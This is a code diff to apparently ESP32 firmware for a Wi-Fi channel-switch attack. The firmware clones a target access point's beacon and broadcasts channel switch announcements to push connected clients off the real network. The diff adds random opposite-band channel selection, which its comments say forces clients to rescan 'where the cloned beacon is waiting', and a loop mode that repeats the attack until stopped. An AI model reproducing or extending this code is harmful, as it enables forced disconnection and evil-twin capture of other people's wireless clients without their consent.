@@ -38,6 +38,7 @@ uint8_t s_new_channel;
 uint8_t s_count;
 uint32_t s_last_tick;
 uint32_t s_hold_until;
+uint32_t s_hold_ms;
 
 // Clients seen on the target BSS (for unicast CSA), most recent last.
 const int kMaxClients = 8;
@@ -52,6 +53,28 @@ uint8_t s_rsn_len;
 uint16_t s_capability;
 
 uint32_t s_frames;
+uint32_t s_cycles;
+bool s_auto_channel;   // announced channel comes from the opposite band
+bool s_loop;           // repeat announce+hold until stopped
+uint8_t s_count_start; // first count of every cycle
+uint32_t s_rng = 0x2545F491;
+
+// 2.4 GHz AP -> a random 5 GHz channel, 5 GHz AP -> a random 2.4 GHz channel.
+// Announcing a channel the client cannot hear on its current band is the point:
+// it drops off the AP and has to rescan where the cloned beacon is waiting.
+uint8_t pick_opposite_band_channel(void) {
+    static const uint8_t k5g[] = {36, 40, 44, 48, 52, 56, 60, 64,  100, 104, 108,
+                                  112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153,
+                                  157, 161, 165};
+    static const uint8_t k24[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
+    s_rng ^= s_rng << 13;
+    s_rng ^= s_rng >> 17;
+    s_rng ^= s_rng << 5;
+    if (s_ap_channel <= 14) {
+        return k5g[s_rng % (sizeof(k5g) / sizeof(k5g[0]))];
+    }
+    return k24[s_rng % (sizeof(k24) / sizeof(k24[0]))];
+}
 
 void note_client(const uint8_t* mac) {
     if (memcmp(mac, kBroadcast, 6) == 0 || memcmp(mac, s_bssid, 6) == 0) {
@@ -188,7 +211,8 @@ void send_clone_beacon(void) {
 
 }  // namespace
 
-bool csa_start(int index, uint8_t new_channel, uint8_t start_count, uint16_t hold_seconds) {
+bool csa_start(int index, uint8_t new_channel, uint8_t start_count, uint16_t hold_seconds,
+               bool loop) {
     const uint8_t* bssid = WiFi.BSSID(index);
     if (bssid == nullptr) {
         return false;
@@ -199,13 +223,18 @@ bool csa_start(int index, uint8_t new_channel, uint8_t start_count, uint16_t hol
     memcpy(s_ssid, ssid.c_str(), s_ssid_len);
     s_ssid[s_ssid_len] = 0;
     s_ap_channel = WiFi.channel(index);
-    s_new_channel = new_channel;
-    s_count = start_count < 2 ? 2 : (start_count > 8 ? 8 : start_count);
+    s_auto_channel = (new_channel == 0);
+    s_new_channel = s_auto_channel ? pick_opposite_band_channel() : new_channel;
+    s_count_start = start_count < 2 ? 2 : (start_count > 8 ? 8 : start_count);
+    s_count = s_count_start;
+    s_loop = loop;
+    s_cycles = 0;
     s_client_count = 0;
     s_rsn_len = 0;
     s_capability = 0;
     s_frames = 0;
-    s_hold_until = millis() + (uint32_t)hold_seconds * 1000UL;
+    s_hold_ms = (uint32_t)hold_seconds * 1000UL;
+    s_hold_until = millis() + s_hold_ms;
 
     esp_wifi_set_channel(s_ap_channel, WIFI_SECOND_CHAN_NONE);
     esp_wifi_set_promiscuous(true);
@@ -236,6 +265,8 @@ void csa_step(void) {
         }
         esp_wifi_set_channel(s_new_channel, WIFI_SECOND_CHAN_NONE);
         s_phase = CSA_HOLD;
+        s_hold_until = millis() + s_hold_ms;
+        s_cycles++;
         return;
     }
 
@@ -245,7 +276,19 @@ void csa_step(void) {
             send_clone_beacon();
         }
         if ((int32_t)(now - s_hold_until) >= 0) {
-            csa_stop();
+            if (!s_loop) {
+                csa_stop();
+                return;
+            }
+            // Next round: back to the AP's channel and announce a fresh channel
+            // (a new random one in auto mode).
+            if (s_auto_channel) {
+                s_new_channel = pick_opposite_band_channel();
+            }
+            s_count = s_count_start;
+            esp_wifi_set_channel(s_ap_channel, WIFI_SECOND_CHAN_NONE);
+            s_last_tick = now - 100;  // fire the first round immediately
+            s_phase = CSA_ANNOUNCE;
         }
     }
 }
@@ -329,6 +372,14 @@ uint32_t csa_clients(void) {
 
 uint8_t csa_new_channel(void) {
     return s_new_channel;
+}
+
+bool csa_auto_channel(void) {
+    return s_auto_channel;
+}
+
+uint32_t csa_cycles(void) {
+    return s_cycles;
 }
 
 uint8_t csa_current_count(void) {
